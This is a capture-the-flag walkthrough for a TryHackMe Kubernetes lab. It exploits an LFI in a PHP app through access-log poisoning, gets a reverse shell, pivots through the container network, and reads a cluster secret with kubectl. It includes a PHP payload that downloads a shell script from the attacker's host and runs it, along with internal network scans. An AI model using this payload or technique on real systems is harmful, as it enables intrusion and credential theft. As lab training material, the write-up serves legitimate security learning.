---
title: TryHackMe - Island Orchestration - Walkthrough
tags: thm web kubernetes kubectl lfi
---

# Description

Only one flag to catch ... !

![2022-06-25_17-29](https://user-images.githubusercontent.com/84577967/175782516-de2830f0-1a00-4e41-bf61-4c8312532785.png)

# Recon

With `nmap` we can find 2 opened ports

```
Nmap scan report for 10.10.160.23
Host is up, received reset ttl 255 (0.013s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

## Port 80

We have a PHP webapp on port 80

![2022-06-25_17-37](https://user-images.githubusercontent.com/84577967/175782766-7c4176c0-0e58-448a-8d8c-32181f7dc4c3.png)

![image](https://user-images.githubusercontent.com/84577967/175782758-ed3c0642-5acc-4fba-92ab-e60e28d9f95d.png)

And looks like we are facing another LFI story ... Internet is full of LFI Cheat Sheet ...

![image](https://user-images.githubusercontent.com/84577967/175782872-51eb640f-22f2-4ef2-afd7-cba363eacd24.png)

The way to get a reverse shell on this webapp is by trying to include the apache2 access_log, I found it on `/proc/self/fd/6`

![image](https://user-images.githubusercontent.com/84577967/175782863-b86ecd11-9215-4605-a7fd-dcb7f83b99a9.png)

And then I injected my payload on UserAgent value

![image](https://user-images.githubusercontent.com/84577967/175782913-8fc573d0-d623-4322-b454-5186f3efa5c6.png)

And we easily were able to get an RCE

![image](https://user-images.githubusercontent.com/84577967/175782954-55971df9-f2fc-46b9-84be-07587472fca7.png)

And to get a reverse shell I injeted this payload

![image](https://user-images.githubusercontent.com/84577967/175783019-f7aa1a23-5564-4ae1-a410-1ba2ed0a3dbd.png)

```php
<?php file_put_contents('/tmp/s.sh',file_get_contents('http://10.8.48.23:8001/s.sh'),FILE_APPEND);system('bash /tmp/s.sh');?>
```

![image](https://user-images.githubusercontent.com/84577967/175783041-e872251e-42a6-4131-909c-1c70cb295ac6.png)

I wasn't able to find some linux binaries such `ifconfig`, `curl` ...

![image](https://user-images.githubusercontent.com/84577967/175783088-70c25bb8-2acb-40bd-b9c8-3231eaf41ffb.png)

So I directly knew that we are inside a docker container or something similar ... and usually in these cases I use my repo where I collected most of linux binaries [linux-static-binaries](https://github.com/ab2pentest/linux-static-binaries)

So let's upload `ifconfig` and see what we have here

![image](https://user-images.githubusercontent.com/84577967/175783182-0f89544d-249d-4008-81ad-c00d15955af8.png)

Great ! looks like we are in a docker let's use nmap and see if we have other containers ... I use this static binary [nmap-static-binaries](https://github.com/opsec-infosec/nmap-static-binaries)

After uploading it

```bash
./nmap 172.17.0.0/24 -vvv
```

output:

```
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up, received conn-refused (0.00027s latency).
Scanned at 2022-06-25 15:38:09 UTC for 4s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT      STATE    SERVICE   REASON
22/tcp    open     ssh       syn-ack
8443/tcp  open     https-alt syn-ack
30000/tcp filtered ndmps     no-response

Nmap scan report for coredns-78fcd69978-ttkch (172.17.0.2)
Host is up, received conn-refused (0.00029s latency).
Scanned at 2022-06-25 15:38:09 UTC for 3s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE SERVICE     REASON
53/tcp   open  domain      syn-ack
8080/tcp open  http-proxy  syn-ack
8181/tcp open  intermapper syn-ack

Nmap scan report for islands-7655b7749f-zvq52 (172.17.0.3)
Host is up, received syn-ack (0.00030s latency).
Scanned at 2022-06-25 15:38:09 UTC for 3s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

There are 3 hosts

### 172.17.0.1

From the ports `10250`, `10256` and `8443` looks like a kubernetes server

```bash
./nmap 172.17.0.1 -p- -vvv

Host is up, received conn-refused (0.00013s latency).
Scanned at 2022-06-25 15:39:27 UTC for 3s
Not shown: 65528 closed ports
Reason: 65528 conn-refused
PORT      STATE    SERVICE   REASON
22/tcp    open     ssh       syn-ack
2376/tcp  open     docker    syn-ack
8443/tcp  open     https-alt syn-ack
10249/tcp open     unknown   syn-ack
10250/tcp open     unknown   syn-ack
10256/tcp open     unknown   syn-ack
30000/tcp filtered ndmps     no-response
```

### 172.17.0.2

I didn't know what this host is doing ...

```bash
./nmap -sC -sV 172.17.0.2 -p- -vvv

Host is up, received conn-refused (0.00013s latency).
Scanned at 2022-06-25 15:38:54 UTC for 16s
Not shown: 65531 closed ports
Reason: 65531 conn-refused
PORT     STATE SERVICE    REASON  VERSION
53/tcp   open  tcpwrapped syn-ack
8080/tcp open  http       syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8181/tcp open  http       syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
9153/tcp open  http       syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

## Kubernetes

So the first thing I always do is downloading `kubectl`

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

Let's try to list pods

```bash
./kubectl get pods
```

![image](https://user-images.githubusercontent.com/84577967/175783551-9ba5d6ff-a7e9-41dc-8972-a77174a1bf4f.png)

The user has no rights to list pods, so let's inspect authorization first 

![image](https://user-images.githubusercontent.com/84577967/175783621-a93738c1-3c71-4fe3-940e-5446b0d20336.png)

Using the command below we can list all what our current user can do

```
./kubectl auth can-i --list
```

![image](https://user-images.githubusercontent.com/84577967/175783658-e9fe2bfa-96ab-4bc6-a996-89701ac02ff4.png)

There is a reousrce named `secrets` let's check what we have there

```bash
./kubectl get secrets
```

![image](https://user-images.githubusercontent.com/84577967/175783710-ada11fa5-38ff-47c3-b1c6-386b2156e251.png)

Looks like we are getting close to get the flag ...

```bash
./kubectl describe secrets/flag
```

![image](https://user-images.githubusercontent.com/84577967/175783748-91ab5b9e-892f-4a93-8302-32a50f785761.png)


```bash
./kubectl describe secrets/flag
```

# Flag

```bash
./kubectl get secret flag -o=json
```

![image](https://user-images.githubusercontent.com/84577967/175783827-fb49db11-56a5-46ea-b936-f680658eed83.png)

We base64 decode the value flag and that's how we got our flag !
